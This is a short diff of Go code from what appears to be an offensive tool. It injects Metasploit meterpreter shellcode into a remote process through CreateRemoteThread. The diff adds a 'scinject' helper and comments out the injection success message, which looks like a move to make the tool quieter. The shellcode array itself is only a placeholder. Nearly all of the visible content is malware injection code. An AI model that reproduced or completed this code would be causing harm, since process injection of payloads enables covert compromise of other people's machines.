@@ -12,11 +12,15 @@ var meterpreterShellcode = []byte{
     // Shellcode here
 }
 
-func executeMSF(shellcode []byte){
-	if len(shellcode) == 0 {
-        shellcode = meterpreterShellcode
+func executeMSF(){
+	scinject(meterpreterShellcode)
+}
+
+func scinject(shellcode []byte) error{
+    if len(shellcode) == 0 {
+        return fmt.Errorf("Empty Shellcode")
     }
-    
+    return nil
 }
 
 func injectIntoRemoteProcess(shellcode []byte, targetProcess string) error {
@@ -68,7 +72,7 @@ func injectIntoRemoteProcess(shellcode []byte, targetProcess string) error {
         return fmt.Errorf("CreateRemoteThread failed: %v", err)
     }
     defer CloseHandle.Call(hThread)
-    fmt.Printf("[+] Injected into %s (PID: %d)\n", targetProcess, pid)
+    //fmt.Printf("[+] Injected into %s (PID: %d)\n", targetProcess, pid)
     return nil
 }
 
